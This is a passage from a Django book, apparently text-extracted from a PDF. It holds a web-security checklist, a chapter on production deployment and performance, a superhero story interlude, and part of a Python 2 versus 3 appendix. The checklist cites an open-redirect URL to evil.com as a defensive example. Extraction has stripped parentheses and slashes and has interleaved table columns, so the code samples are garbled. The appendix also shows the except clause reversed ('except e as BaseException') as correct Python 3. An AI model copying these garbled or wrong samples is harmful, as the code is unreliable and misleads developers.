the Sentinel network can?" "In fact, they can for smaller keys. Based on the tests I am running  right now, their powers have grown significantly. At this rate, they  should be ready for another attack in less than 24 hours." "Damn, that's when SuperBook goes live!"  [ 665 ]  Chapter 10   A handy security checklist Security is not an afterthought but is instead integral to the way you write  applications. However, being human, it is handy to have a checklist to remind   you of the common omissions.  The following points are a bare minimum of security checks that you should   perform before making your Django application public:     Don't trust data from a browser, API, or any outside sources: This is a  fundamental rule. Make sure you validate and sanitize any outside data.     Don't keep SECRET_KEY in version control: As a best practice, pick    SECRET_KEY from the environment. Check out the django-environ package.    Don't store passwords in plain text: Store your application password hashes   instead. Add a random salt as well.     Don't log any sensitive data: Filter out the confidential data such as credit   card details or API keys from your log files.     Any secure transaction or login should use SSL: Be aware that   eavesdroppers in the same network as you are could listen to your web  traffic if is not in HTTPS. Ideally, you ought to use HTTPS for the entire site.    Avoid using redirects to user-supplied URLs: If you have redirects such as  http:  example.com r?url=http:  evil.com, then always check against  whitelisted domains.     Check authorization even for authenticated users: Before performing    any change with side effects, check whether the logged-in user is allowed   to perform it.     Use the strictest possible regular expressions: Be it your URLconf or   form validators, you must avoid lazy and generic regular expressions.     Don't keep your Python code in web root: This can lead to an accidental   leak of source code if it gets served as plain text.     Use Django templates instead of building strings by hand: Templates    have protection against XSS attacks.     Use Django ORM rather than SQL commands: The ORM offers protection   against SQL injection.     Use Django forms with POST input for any action with side effects: It might   seem like overkill to use forms for a simple vote button. Do it.     CSRF should be enabled and used: Be very careful if you are exempting   certain views using the @csrf_exempt decorator.  [ 666 ]  Security      Ensure that Django and all packages are the latest versions: Plan for   updates. They might need some changes to be made to your source code.  However, they bring shiny new features and security fixes too.     Limit the size and type of user-uploaded files: Allowing large file uploads  can cause denial-of-service attacks. Deny uploading of executables or scripts.    Have a backup and recovery plan: Thanks to Murphy, you can plan for an  inevitable attack, catastrophe, or any other kind of downtime. Make sure   you take frequent backups to minimize data loss.  Some of these can be checked automatically using Erik's Pony Checkup at   http:  ponycheckup.com . However, I would recommend that you print or   copy this checklist and stick it on your desk.  Remember that this list is by no means exhaustive and not a substitute for a   proper security audit by a professional.  Summary In this chapter, we looked at the common types of attacks affecting websites   and web applications. In many cases, the explanation of the techniques has been  simplified for clarity at the cost of detail. However, once we understand the severity  of the attack, we can appreciate the countermeasures that Django provides.  In our final chapter, we will take a look at pre-deployment activities in more detail.  We will also take a look at the various deployment strategies, such as cloud-based  hosting for deploying a Django application.  [ 667 ]  Chapter 10    Production-ready  In this chapter, we will discuss the following topics:     Picking a web stack    Hosting approaches    Deployment tools    Monitoring    Performance tips  So, you have developed and tested a fully functional web application in Django.  Deploying this application can involve a diverse set of activities from choosing your  hosting provider to performing installations. Even more challenging could be the  tasks of maintaining a production site working without interruptions and handling  unexpected bursts in traffic.  The discipline of system administration is vast. Hence, this chapter will cover a   lot of ground. However, given the limited space, we will attempt to familiarize   you with the various aspects of building a production environment.  Production environment Although, most of us intuitively understand what a production environment is, it  is worthwhile to clarify what it really means. A production environment is simply  one where end users use your application. It should be available, resilient, secure,  responsive, and must have abundant capacity for current  and future  needs.  [ 669 ]   Unlike a development environment, the chance of real business damage due to   any issues in a production environment is high. Hence, before moving to production,  the code is moved to various testing and acceptance environments in order to get  rid of as many bugs as possible. For easy traceability, every change made to the  production environment must be tracked, documented, and made accessible to  everyone in the team.  As an upshot, there must be no development performed directly on the production  environment. In fact, there is no need to install development tools, such as a compiler  or debugger in production. The presence of any additional software increases the  attack surface of your site and could pose a security risk.  Most web applications are deployed on sites with extremely low downtime, say,  large data centers running 24 7 365. By designing for failure, even if an internal  component fails, there is enough redundancy to prevent the entire system crashing.  This concept of avoiding a single point of failure  SPOF  can be applied at every  level—hardware or software.  Hence, it is crucial which collection of software you choose to run in your   production environment.  Choosing a web stack So far, we have not discussed the stack on which your application will be running on.  Even though we are talking about it at the very end, it is best not to postpone such  decisions to the later stages of the application lifecycle. Ideally, your development  environment must be as close as possible to the production environment to avoid   the "but it works on my machine" argument.  By a web stack, we refer to the set of technologies that are used to build a web  application. It is usually depicted as a series of components, such as OS, database,  and web server, all piled on top of one another. Hence, it is referred to as a stack.  We will mainly focus on open source solutions here because they are widely used.  However, various commercial applications can also be used if they are more suited  to your needs.  [ 670 ]  Production-ready   Components of a stack A production Django web stack is built using several kinds of application  or layers,  depending on your terminology . While constructing your web stack, some of the  choices you might need to make are as follows:     Which OS and distribution? For example: Debian, Red Hat, or OpenBSD.    Which WSGI server? For example: Gunicorn, uWSGI.    Which web server? For example: Apache, Nginx.    Which database? For example: PostgreSQL, MySQL, or Redis.    Which caching system? For example: Memcached, Redis.    Which process control and monitoring system? For example: Upstart,   Systemd, or Supervisord.     How to store static media? For example: Amazon S3, CloudFront.  There could be several more, and these choices are not mutually exclusive   either. Some use several of these applications in tandem. For example, username  availability might be looked up on Redis, while the primary database might   be PostgreSQL.  There is no 'one size fits all' answer when it comes to selecting your stack. Different  components have different strengths and weaknesses. Choose them only after  careful consideration and testing. For instance, you might have heard that Nginx  is a popular choice for a web server, but you might actually need Apache's rich  ecosystem of modules or options.  Sometimes, the selection of the stack is based on various non-technical reasons.   Your organization might have standardized on a particular operating system, say,  Debian for all its servers. Or your cloud hosting provider might support only a  limited set of stacks.  Hence, how you choose to host your Django application is one of the key factors   in determining your production setup.  [ 671 ]  Chapter 11   Hosting When it comes to hosting, you need to make sure whether to go for a hosting  platform such as Heroku or not. If you do not know much about managing a   server or do not have anyone with that knowledge in your team, then a hosting  platform is a convenient option.  Platform as a service A Platform as a Service  PaaS  is defined as a cloud service where the solution stack  is already provided and managed for you. Popular platforms for Django hosting  include Heroku, PythonAnywhere, and Google App Engine.  In most cases, deploying a Django application should be as simple as selecting the  services or components of your stack and pushing out your source code. You do  not have to perform any system administration or setup yourself. The platform is  entirely managed.  Like most cloud services, the infrastructure can also scale on demand. If you   need an additional database server or more RAM on a server, it can be easily  provisioned from a web interface or the command line. The pricing is primarily  based on your usage.  The bottom line with such hosting platforms is that they are very easy to set up and  ideal for smaller projects. They tend to be more expensive as your user base grows.  Another downside is that your application might get tied to a platform or   become difficult to port. For instance, Google App Engine is used to support only  a non-relational database, which means you need to use django-nonrel, a fork of  Django. This limitation is now somewhat mitigated with Google Cloud SQL.  Virtual private servers A virtual private server  VPS  is a virtual machine hosted in a shared environment.  From the developer's perspective, it would seem like a dedicated machine  hence,  the word private  preloaded with an operating system. You will need to install and  set up the entire stack yourself, though many VPS providers such as WebFaction and  DigitalOcean offer easier Django setups.  [ 672 ]  Production-ready   If you are a beginner and can spare some time, I highly recommend this approach.  You would be given root access, and you can build the entire stack yourself. You   will not only understand how various pieces of the stack come together but also   have full control in fine-tuning each individual component.  Compared to a PaaS, a VPS might work out to be more value for money,   especially for high-traffic sites. You might be able to run several sites from the   same server as well.  Other hosting approaches Even though hosting on a platform or VPS are by far the two most popular hosting  options, there are plenty of other options. If you are interested in maximizing  performance, you can opt for a bare metal server with colocation from providers,  such as Rackspace.  On the lighter end of the hosting spectrum, you can save the cost by hosting multiple  applications within Docker containers. Docker is a tool to package your application  and dependencies in a virtual container. Compared to traditional virtual machines,  a Docker container starts up faster and has minimal overheads  since there is no  bundled operating system or hypervisor .  Docker is ideal for hosting micro services-based applications. It is becoming as  ubiquitous as virtualization with almost every PaaS and VPS provider supporting  them. It is also a great development platform since Docker containers encapsulate   the entire application state and can be directly deployed to production.  Deployment tools Once you have zeroed in on your hosting solution, there could be several   steps in your deployment process, from running regression tests to spawning  background services.  The key to a successful deployment process is automation. Since deploying  applications involve a series of well-defined steps, it can be rightly approached   as a programming problem. Once you have an automated deployment in place,   you do not have to worry about deployments for fear of missing a step.  [ 673 ]  Chapter 11   In fact, deployments should be painless and as frequent as required. For example,  the Facebook team can release code to production up to twice a day. Considering  Facebook's enormous user base and code base, this is an impressive feat, yet, it  becomes necessary as emergency bug fixes and patches need to be deployed   as soon as possible.  A good deployment process is also idempotent. In other words, even if you  accidentally run the deployment tool twice, the actions should not be executed   twice  or rather it should leave it in the same state .  Let's take a look at some of the popular tools for deploying Django applications.  Fabric Fabric is favored among Python web developers for its simplicity and ease of use.  It expects a file named fabfile.py that defines all the actions  for deployment  or otherwise  in your project. Each of these actions can be a local or remote shell  command. The remote host is connected via SSH.  The key strength of Fabric is its ability to run commands on a set of remote hosts.   For instance, you can define a web group that contains the hostnames of all web  servers in production. You can run a Fabric action only against these web servers   by specifying the web group name on the command line.  To illustrate the tasks involved in deploying a site using Fabric, let's take a look   at a typical deployment scenario.  Typical deployment steps Imagine that you have a medium-sized web application deployed on a single web  server. Git has been chosen as the version control and collaboration tool. A central  repository that is shared with all users has been created in the form of a bare Git tree.  Let's assume that your production server has been fully set up. When you run your  Fabric deployment command, say, fab deploy, the following scripted sequence of  actions take place:  1.  Run all tests locally. 2.  Commit all local changes to Git. 3.  Push to a remote central Git repository. 4.  Resolve merge conflicts, if any. 5.  Collect the static files  CSS, images .  [ 674 ]  Production-ready   6.  Copy the static files to the static file server. 7.  At remote host, pull changes from a central Git repository. 8.  At remote host, run  database  migrations. 9.  At remote host, touch app.wsgi to restart WSGI server.  The entire process is automatic and should be completed in a few seconds. By  default, if any step fails, then the deployment gets aborted. Though not explicitly  mentioned, there would be checks to ensure that the process is idempotent.  Note that Fabric is not yet compatible with Python 3, though the developers are   in the process of porting it. In the meantime, you can run Fabric in a Python 2.x  virtual environment or check out similar tools, such as PyInvoke.  Configuration management Managing multiple servers in different states can be hard with Fabric. Configuration  management tools such as Chef, Puppet, or Ansible try to bring a server to a certain  desired state.  Unlike Fabric, which requires the deployment process to be specified in an imperative  manner, these configuration-management tools are declarative. You just need to define  the final state you want the server to be in, and it will figure out how to get there.  For example, if you want to ensure that the Nginx service is running at startup on  all your web servers, then you need to define a server state having the Nginx service  both running and starting on boot. On the other hand, with Fabric, you need to  specify the exact steps to install and configure Nginx to reach such a state.  One of the most important advantages of configuration-management tools is that they  are idempotent by default. Your servers can go from an unknown state to a known  state, resulting in easier server configuration management and reliable deployment.  Among configuration-management tools, Chef and Puppet enjoy wide popularity  since they were one of the earliest tools in this category. However, their roots in  Ruby can make them look a bit unfamiliar to the Python programmer. For such   folks, we have Salt and Ansible as excellent alternatives.  Configuration-management tools have a considerable learning curve compared   to simpler tools, such as Fabric. However, they are essential tools for creating   reliable production environments and are certainly worth learning.  [ 675 ]  Chapter 11   Monitoring Even a medium-sized website can be extremely complex. Django might be one of the  hundreds of applications and services running and interacting with each other. In  the same way that the heart beat and other vital signs can be constantly monitored   to assess the health of the human body, so are various metrics collected, analyzed,  and presented in most production systems.  While logging keeps track of various events, such as arrival of a web request   or an exception, monitoring usually refers to collecting key information periodically,  such as memory utilization or network latency. However, differences get blurred  at application level, such as, while monitoring database query performance, which  might very well be collected from logs.  Monitoring also helps with the early detection of problems. Unusual patterns, such  as spikes or a gradually increasing load, can be signs of bigger underlying problems,  such as a memory leak. A good monitoring system can alert site owners of problems  before they happen. Monitoring tools usually need a backend service  sometimes called agents  to   collect the statistics, and a frontend service to display dashboards or generate  reports. Popular data collection backends include StatsD and Monit. This data   can be passed to frontend tools, such as Graphite.  There are several hosted monitoring tools, such as New Relic and Status.io,   which are easier to set up and use.  Measuring performance is another important role of monitoring. As we will soon  see, any proposed optimization must be carefully measured and monitored before  getting implemented.  Performance Performance is a feature. Studies show how slow sites have an adverse effect on  users, and therefore, revenue. For instance, tests at Amazon in 2007 revealed that for  every 100 ms increase in load time of amazon.com, the sales decreased by 1 percent.  Reassuringly, several high-performance web applications such as Disqus and  Instagram have been built on Django. At Disqus, in 2013, they could handle 1.5  million concurrently connected users, 45,000 new connections per second, 165,000  messages second, with less than 0.2 seconds latency end-to-end.  [ 676 ]  Production-ready   The key to improving performance is finding where the bottlenecks are. Rather than  relying on guesswork, it is always recommended that you measure and profile your  application to identify these performance bottlenecks. As Lord Kelvin would say:   If you can't measure it, you can't improve it.  In most web applications, the bottlenecks are likely to be at the browser or the  database end rather than within Django. However, to the user, the entire application  needs to be responsive.  Let's take a look at some of the ways to improve the performance of a Django  application. Due to widely differing techniques, the tips are split into two parts:  frontend and backend.  Frontend performance Django programmers might quickly overlook frontend performance because   it deals with understanding how the client-side, usually a browser, works.   However, to quote Steve Souders' study of Alexa-ranked top 10 websites:  80-90% of the end-user response time is spent on the frontend. Start there.  A good starting point for frontend optimization would be to check your site   with Google Page Speed or Yahoo! YSlow  commonly used as browser plugins .  These tools will rate your site and recommend various best practices, such as  minimizing the number of HTTP requests or gzipping the content.  As a best practice, your static assets, such as images, style sheets, and JavaScript   files must not be served through Django. Rather a static file server, cloud storages  such as Amazon S3 or a content delivery network  CDN  should serve them for  better performance.  Even then, Django can help you improve frontend performance in a number of ways:    Cache infinitely with CachedStaticFilesStorage: The fastest way to load  static assets is to leverage the browser cache. By setting a long caching time,  you can avoid re-downloading the same asset again and again. However, the  challenge is to know when not to use the cache when the content changes. CachedStaticFilesStorage solves this elegantly by appending the asset's  MD5 hash to its filename. This way, you can extend the TTL of the cache for  these files infinitely.  [ 677 ]  Chapter 11   To use this, set the STATICFILES_STORAGE to CachedStaticFilesStorage   or, if you have a custom storage, inherit from CachedFilesMixin. Also, it  is best to configure your caches to use the local memory cache backend to  perform the static filename to its hashed name lookup.     Use a static asset manager: An asset manager can preprocess your static   assets to minify, compress, or concatenate them, thereby reducing their size  and minimizing requests. It can also preprocess them enabling you to write  them in other languages, such as CoffeeScript and Syntactically awesome  stylesheets  Sass . There are several Django packages that offer static asset  management such as django-pipeline or webassets.  Backend performance The scope of backend performance improvements covers your entire server-side  web stack, including database queries, template rendering, caching, and background  jobs. You will want to extract the highest performance from them, since it is entirely  within your control.  For quick and easy profiling needs, django-debug-toolbar is quite handy. We can  also use Python profiling tools, such as the hotshot module for detailed analysis. In  Django, you can use one of the several profiling middleware snippets to display the  output of hotshot in the browser.  A recent live-profiling solution is django-silk. It stores all the requests and  responses in the configured database, allowing aggregated analysis over an entire  user session, say, to find the worst-performing views. It can also profile any piece   of Python code by adding a decorator.  As before, we will take a look at some of the ways to improve backend performance.  However, considering they are vast topics in themselves, they have been grouped  into sections. Many of these have already been covered in the previous chapters but  have been summarized here for easy reference.  Templates As the documentation suggests, you should enable the cached template loader in  production. This avoids the overhead of reparsing and recompiling the templates  each time it needs to be rendered. The cached template is compiled the first time it   is needed and then stored in memory. Subsequent requests for the same template   are served from memory.  [ 678 ]  Production-ready   If you find that another templating language such as Jinja2 renders your page  significantly faster, then it is quite easy to replace the built-in Django template  language. There are several libraries that can integrate Django and Jinja2, such   as django-jinja. Django 1.8 is expected to support multiple templating engines   out of the box.  Database Sometimes, the Django ORM can generate inefficient SQL code. There are several  optimization patterns to improve this:     Reduce database hits with select_related: If you are using a   OneToOneField or a Foreign Key relationship, in forward direction,   for a large number of objects, then select_related   can perform a   SQL join and reduce the number of database hits.     Reduce database hits with prefetch_related: For accessing a   ManyToManyField method or, a Foreign Key relation, in reverse direction,   or a Foreign Key relation in a large number of objects, consider using  prefetch_related to reduce the number of database hits.     Fetch only needed fields with values or values_list: You can save time   and memory usage by limiting queries to return only the needed fields   and skip model instantiation using values   or values_list  .     Denormalize models: Selective denormalization improves performance  by reducing joins at the cost of data consistency. It can also be used for  precomputing values, such as the sum of fields or the active status report  into an extra column. Compared to using annotated values in queries,  denormalized fields are often simpler and faster.     Add an Index: If a non-primary key gets searched a lot in your queries,  consider setting that field's db_index to True in your model definition.    Create, update, and delete multiple rows at once: Multiple objects can  be operated upon in a single database query with the bulk_create  ,  update  , and delete   methods. However, they come with several  important caveats such as skipping the save   method on that model.   So, read the documentation carefully before using them.  As a last resort, you can always fine-tune the raw SQL statements using proven  database performance expertise. However, maintaining the SQL code can be   painful over time.  [ 679 ]  Chapter 11   Caching Any computation that takes time can take advantage of caching and return  precomputed results faster. However, the problem is stale data or, often,   quoted as one of the hardest things in computer science, cache invalidation.   This is commonly spotted when, despite refreshing the page, a YouTube video's  view count doesn't change.  Django has a flexible cache system that allows you to cache anything from a   template fragment to an entire site. It allows a variety of pluggable backends   such as file-based or data-based backed storage.  Most production systems use a memory-based caching system such as Redis or  Memcached. This is purely because volatile memory is many orders of magnitude  faster than disk-based storage.  Such cache stores are ideal for storing frequently used but ephemeral data, like   user sessions. Cached session backend By default, Django stores its user session in the database. This usually gets   retrieved for every request. To improve performance, the session data can be   stored in memory by changing the SESSION_ENGINE setting. For instance,   add the following in settings.py to store the session data in your cache:  SESSION_ENGINE = "django.contrib.sessions.backends.cache"  Since some cache storages can evict stale data leading to the loss of session data,   it is preferable to use Redis or Memcached as the session store, with memory   limits high enough to support the maximum number of active user sessions. Caching frameworks For basic caching strategies, it might be easier to use a caching framework.   Two popular ones are django-cache-machine and django-cachalot. They   can handle common scenarios, such as automatically caching results of queries   to avoid database hits every time you perform a read.  The simplest of these is Django-cachalot, a successor of Johnny Cache. It requires  very little configuration. It is ideal for sites that have multiple reads and infrequent  writes  that is, the vast majority of applications , it caches all Django ORM read  queries in a consistent manner.  [ 680 ]  Production-ready   Caching patterns Once your site starts getting heavy traffic, you will need to start exploring several  caching strategies throughout your stack. Using Varnish, a caching server that sits  between your users and Django, many of your requests might not even hit the  Django server.  Varnish can make pages load extremely fast  sometimes, hundreds of times faster  than normal . However, if used improperly, it might serve static pages to your   users. Varnish can be easily configured to recognize dynamic pages or dynamic   parts of a page such as a shopping cart. Russian doll caching, popular in the Rails community, is an interesting template  cache-invalidation pattern. Imagine a user's timeline page with a series of posts   each containing a nested list of comments. In fact, the entire page can be considered  as several nested lists of content. At each level, the rendered template fragment   gets cached.  So, if a new comment gets added to a post, only the associated post and timeline  caches get invalidated. Notice that we first invalidate the cache content directly  outside the changed content and move progressively until at the outermost content.  The dependencies between models need to be tracked for this pattern to work.  Another common caching pattern is to cache forever. Even after the content changes,  the user might get served stale data from the cache. However, an asynchronous  job, such as, a Celery job, also gets triggered to update the cache. You can also  periodically warm the cache at a certain interval to refresh the content.  Essentially, a successful caching strategy identifies the static and dynamic parts  of a site. For many sites, the dynamic parts are the user-specific data when you  are logged in. If this is separated from the generally available public content, then  implementing caching becomes easier.  Don't treat caching as integral to the working of your site. The site must fall back to   a slower but working state even if the caching system breaks down.  [ 681 ]  Chapter 11   Cranos It was six in the morning and the S.H.I.M. building was surrounded  by a grey fog. Somewhere inside, a small conference room had been  designated the "War Room." For the last three hours, the SuperBook  team had been holed up here diligently executing their pre-go-live plan. More than 30 users had logged on the IRC chat room superbookgolive  from various parts of the world. The chat log was projected on a giant  whiteboard. When the last item was struck off, Evan glanced at Steve.  Then, he pressed a key triggering the deployment process. The room fell silent as the script output kept scrolling off the wall. One  error, Steve thought—just one error can potentially set them back by  hours. Several seconds later, the command prompt reappeared. It was  live! The team erupted in joy. Leaping from their chairs they gave   high-fives to each other. Some were crying tears of happiness. After  weeks of uncertainty and hard work, it all seemed surreal. However, the celebrations were short-lived. A loud explosion from  above shook the entire building. Steve knew the second breach had  begun. He shouted to Evan, "Don't turn on the beacon until you get   my message," and sprinted out of the room. As Steve hurried up the stairway to the rooftop, he heard the sound of  footsteps above him. It was Madam O. She opened the door and flung  herself in. He could hear her screaming "No!" and a deafening blast  shortly after that. By the time he reached the rooftop, he saw Madam O sitting with her  back against the wall. She clutched her left arm and was wincing in  pain. Steve slowly peered around the wall. At a distance, a tall bald  man seemed to be working on something with the help of two robots. "He looks like…." Steve broke off, unsure of himself. "Yes, it is Hart. Rather I should say he is Cranos now." "What?" "Yes, a split personality. A monster that laid hidden in Hart's mind for  years. I tried to help him control it. Many years back, I thought I had  stopped it from ever coming back. However, all this stress took a toll on  him. Poor thing, if only I could get near him."  [ 682 ]  Production-ready   Poor thing indeed—he nearly tried to kill her. Steve took out his mobile  and sent out a message to turn on the beacon. He had to improvise. With his hands high in the air and fingers crossed, he stepped out. The  two robots immediately aimed directly at him. Cranos motioned them  to stop. "Well, who do we have here? Mr. SuperBook himself. Did I crash into  your launch party, Steve?" "It was our launch, Hart." "Don't call me that," growled Cranos. "That guy was a fool. He wrote  the Sentinel code but he never understood its potential. I mean, just  look at what Sentinels can do—unravel every cryptographic algorithm  known to man. What happens when it enters an intergalactic network?" The hint was not lost on Steve. "SuperBook?" he asked slowly. Cranos let out a malicious grin. Behind him, the robots were busy  wiring into S.H.I.M.'s core network. "While your SuperBook users will  be busy playing SuperVille, the tentacles of Sentinel will spread into  new unsuspecting worlds. Critical systems of every intelligent species  will be sabotaged. The Supers will have to bow to a new intergalactic  supervillain—Cranos." As Cranos was delivering this extended monologue, Steve noticed a  movement in the corner of his eyes. It was Acorn, the super-intelligent  squirrel, scurrying along the right edge of the rooftop. He also spotted  Hexa hovering strategically on the other side. He nodded at them. Hexa levitated a garbage bin and flung it towards the robots. Acorn  distracted them with high-pitched whistles. "Kill them all!" Cranos  said irritably. As he turned to watch his intruders, Steve fished out his  phone, dialed into FaceTime and held it towards Cranos. "Say hello to your old friend, Cranos," said Steve. Cranos turned to face the phone and the screen revealed Madam  O's face. With a smile, she muttered under her breath, "Taradiddle  Bumfuzzle!" The expression on Cranos' face changed instantly. The seething anger  disappeared. He now looked like a man they had once known. "What happened?" asked Hart confused. "We thought we had lost you," said Madam O over the phone. "I had   to use hypnotic trigger words to bring you back." Hart took a moment to survey the scene around him. Then, he slowly  smiled and nodded at her. ----------------------------------------------------  [ 683 ]  Chapter 11   One Year Later Who would have guessed Acorn would turn into an intergalactic  singing sensation in less than a year? His latest album "Acorn  Unplugged" debuted at the top of Billboard's Top 20 chart. He had  thrown a grand party in his new white mansion overlooking a lake.   The guest list included superheroes, pop stars, actors, and celebrities   of all sorts. "So, there was a singer in you after all," said Captain Obvious holding   a martini. "I guess there was," replied Acorn. He looked dazzling in a golden  tuxedo with all sorts of bling-bling. Steve appeared with Hexa in tow—who looked ravishing in a flowing  silver gown. "Hey Steve, Hexa.... It has been a while. Is SuperBook still keeping you  late at work, Steve?" "Not so much these days. Knock on wood," replied Hexa with a smile. "Ah, you guys did a fantastic job. I owe a lot to SuperBook. My first  single, 'Warning: Contains Nuts', was a huge hit in the Tucana galaxy.  They watched the video on SuperBook more than a billion times!" "I am sure every other superhero has a good thing to say about  SuperBook too. Take Blitz. His AskMeAnything interview won back  the hearts of his fans. They were thinking that he was on experimental  drugs all this time. It was only when he revealed that his father was  Hurricane that his powers made sense." "By the way, how is Hart doing these days?" "Much better," said Steve. "He got professional help. The sentinels  were handed back to S.H.I.M. They are developing a new quantum  cryptographic algorithm that will be much more secure." "So, I guess we are safe until the next supervillain shows up," said  Captain Obvious hesitantly. "Hey, at least the beacon works," said Steve, and the crowd burst into  laughter.  [ 684 ]  Production-ready   Summary In this final chapter, we looked at various approaches to make your Django  application stable, reliable, and fast. In other words, to make it production-ready.   While system administration might be an entire discipline in itself, a fair knowledge  of the web stack is essential. We explored several hosting options, including PaaS  and VPS.  We also looked at several automated deployment tools and a typical deployment  scenario. Finally, we covered several techniques to improve frontend and   backend performance.  The most important milestone of a website is finishing and taking it to production.  However, it is by no means the end of your development journey. There will be   new features, alterations, and rewrites.  Every time you revisit the code, use the opportunity to take a step back and find   a cleaner design, identify a hidden pattern, or think of a better implementation.  Other developers, or sometimes your future self, will thank you for it.  [ 685 ]  Chapter 11    Python 2 versus Python 3  All the code samples in this book have been written for Python 3.4. Except for very  minor changes, they would work in Python 2.7 as well. The author believes that  Python 3 has crossed the tipping point for being the preferred choice for new   Django projects. Python 2.7 development was supposed to end in 2015 but was extended for five  more years through 2020. There will not be a Python 2.8. Soon all major Linux  distributions would have completely switched to using Python 3 as a default.   Many PaaS providers such as Heroku already support Python 3.4. Most of the packages listed in the Python Wall of Superpowers have turned green   indicating that they have support for Python 3 . Almost all the red ones have an  actively developed Python 3 port. Django has been supporting Python 3 since Version 1.5. In fact, the strategy   was to rewrite the code in Python 3 and deal with Python 2 as a backward  compatibility requirement. This is primarily implemented using utility   functions from Six, a Python 2 and 3 compatibility library. As you will soon see, Python 3 is a superior language in many ways due to  numerous improvements primarily towards consistency. Yet, if you are building   web applications with Django, the number of differences you might encounter   while moving to Python 3 are quite trivial.  But I still use Python 2.7! If you are stuck with a Python 2.7 environment, then the sample project can be easily  backported. There is a custom script named backport3to2.py at the project root that  can perform a one-way conversion to Python 2.x. Note that it is not general enough  for using in other projects.  However, if you are interested in knowing why Python 3 is better, then read on.  [ 687 ]   Python 3 Python 3 was born out of necessity. One of Python 2's major annoyances was its  inconsistent handling of non-English characters  commonly manifested as the  infamous UnicodeDecodeError exception . Guido initiated the Python 3 project to  clean up a number of such language issues while breaking backward compatibility.  The first alpha release of Python 3.0 was made in August 2007. Since then, Python 2  and Python 3 have been in parallel development by the core development team for a  number of years. Ultimately, Python 3 is expected to be the future of the language.  Python 3 for Djangonauts This section covers the most important changes in Python 3 from a Django developer's  perspective. For the full list of changes, please refer to the recommended reading  section at the end of this chapter.  The examples are given in both Python 3 and Python 2. Depending on your  installation, all Python 3 commands might need to be changed from python   to python3 or python3.4.  Change all the __unicode__ methods   into __str__ In Python 3, the __str__   method is called for string representation of your models  rather than the awkward sounding __unicode__   method. This is one of the most  evident ways to identify Python 3 ported code:  Python 2  Python 3  class Person models.Model :     name = models.TextField    class Person models.Model :     name = models.TextField        def __unicode__ self :         return self.name      def __str__ self :         return self.name  The preceding table reflects the difference in the way Python 3 treats strings.   In Python 2, the human-readable representation of a class can be returned by  __str__    bytes  or __unicode__    text . However, in Python 3 the readable  representation is simply returned by __str__    text .  [ 688 ]  Python 2 versus Python 3   All classes inherit from the object class Python 2 has two kinds of classes: old-style  classic  and new-style. New-style classes  are classes that directly or indirectly inherit from object. Only the new-style classes  can use Python's advanced features, such as slots, descriptors, and properties. Many  of these are used by Django. However, classes were still old-style by default for  compatibility reasons.  In Python 3, the old-style classes don't exist anymore. As seen in the following table,  even if you don't explicitly mention any parent classes, the object class will be  present as a base. So, all the classes are new-style.  Python 2 >>> class CoolMixin: ...     pass >>> CoolMixin.__bases__       Python 3 >>> class CoolMixin: ...     pass >>> CoolMixin.__bases__    ,    Calling super   is easier The simpler call to super  , without any arguments, will save you some typing   in Python 3.  Python 2  Python 3  class CoolMixin object :  class CoolMixin:      def do_it self :         return super CoolMixin,                    self .do_it        def do_it self :         return super  .do_it    Specifying the class name and instance is optional, thereby making your code DRY  and less prone to errors while refactoring.  Relative imports must be explicit Imagine the following directory structure for a package named app1:   app1    __init__.py    models.py    tests.py   [ 689 ]  Appendix   Now, in Python 3, let's run the following code in the parent directory of app1:  $ echo "import models" > app1 tests.py $ python -m app1.tests Traceback  most recent call last :    ... omitted ... ImportError: No module named 'models' $ echo "from . import models" > app1 tests.py $ python -m app1.tests  Successfully imported  Within a package, you should use explicit relative imports while referring to a  sibling module. You can omit __init__.py in Python 3, though it is commonly   used to identify a package.  In Python 2, you can use import models to successfully import the models.py  module. However, it is ambiguous and can accidentally import any other models.py  in your Python path. Hence, this is forbidden in Python 3 and discouraged in   Python 2 as well.  HttpRequest and HttpResponse have str and  bytes types In Python 3, according to PEP 3333  amendments to the WSGI standard , we are  careful not to mix data coming from or leaving via HTTP, which will be in bytes,   as opposed to the text within the framework, which will be native  Unicode  strings.  Essentially, for the HttpRequest and HttpResponse objects:     Headers will always be the str objects     Input and output streams will always be the byte objects  Unlike Python 2, the strings and bytes are not implicitly converted while performing  comparisons or concatenations with each other. Strings mean Unicode strings only.  Exception syntax changes and improvements Exception-handling syntax and functionality has been significantly improved   in Python 3.  [ 690 ]  Python 2 versus Python 3   In Python 3, you cannot use the comma-separated syntax for the except clause.   Use the as keyword instead:  Python 2 try:   pass except e, BaseException:   pass  Python 3 and 2  try:   pass except e as BaseException:   pass  The new syntax is recommended for Python 2 as well.  In Python 3, all the exceptions must be derived  directly or indirectly  from  BaseException. In practice, you would create your custom exceptions by deriving  from the Exception class.  As a major improvement in error reporting, if an exception occurs while handling an  exception, then the entire chain of exceptions are reported:  Python 2 >>> try: ...   print undefined  ... except Exception: ...   print oops  ...  Traceback  most recent call  last :   File " ", line 4, in     NameError: name 'oops' is not  defined  Python 3 >>> try: ...   print undefined  ... except Exception: ...   print oops  ...  Traceback  most recent call last :   File " ", line 2, in    NameError: name 'undefined' is not  defined  Once you get used to this feature, you will definitely miss it in Python 2.  During the handling of the preceding  exception, another exception occurred:  Traceback  most recent call last :   File " ", line 4, in    NameError: name 'oops' is not  defined  [ 691 ]  Appendix   Standard library reorganized The core developers have cleaned up and organized the Python standard library.   For instance, SimpleHTTPServer now lives in the http.server module:  Python 2 $ python -m SimpleHTTPServer  Python 3 $python -m http.server  Serving HTTP on 0.0.0.0 port  8000 ...  Serving HTTP on 0.0.0.0 port 8000  ...  New goodies Python 3 is not just about language fixes. It is also where bleeding-edge Python  development happens. This means improvements to the language in terms of syntax,  performance, and built-in functionality.  Some of the notable new modules added to Python 3 are as follows:     asyncio: This contains asynchronous I O, event loop, coroutines, and tasks    unittest.mock: This contains the mock object library for testing    pathlib: This contains object-oriented file system paths    statistics: This contains mathematical statistics functions  Even if some of these modules have backports to Python 2, it is more appealing to  migrate to Python 3 and leverage them as built-in modules.  Using Pyvenv and Pip Most serious Python developers prefer to use virtual environments. virtualenv   is quite popular for isolating your project setup from the system-wide Python  installation. Thankfully, Python 3.3 is integrated with a similar functionality   using the venv module.  Since Python 3.4, a fresh virtual environment will be pre-installed with pip, a  popular installer:  $ python -m venv djenv  [djenv] $ source djenv bin activate  [djenv] $ pip install django  [ 692 ]  Python 2 versus Python 3   Notice that the command prompt changes to indicate that your virtual environment  has been activated.  Other changes We cannot possibly fit all the Python 3 changes and improvements in this appendix.  However, the other commonly cited changes are as follows:  1.  print   is now a function: Previously, it was a statement, that is, arguments   2.  Integers don't overflow: sys.maxint is outdated, integers will have   were not in parenthesis.  unlimited precision.  